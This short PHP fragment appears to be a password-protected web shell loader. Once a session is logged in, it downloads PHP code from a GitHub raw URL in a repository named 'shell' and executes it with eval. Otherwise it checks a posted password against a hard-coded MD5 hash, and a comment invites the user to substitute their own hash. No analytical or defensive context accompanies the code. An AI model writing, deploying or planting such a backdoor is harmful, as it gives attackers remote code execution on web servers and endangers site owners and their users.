...
if (is_logged_in()) {
    ...
    $a = geturlsinfo('https://raw.githubusercontent.com/mangoleh098/shell/refs/heads/main/sample.php');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password = 'ec672df85896d9d8f0ca6edae30d7f2a'; // Replace this with your MD5 hashed password
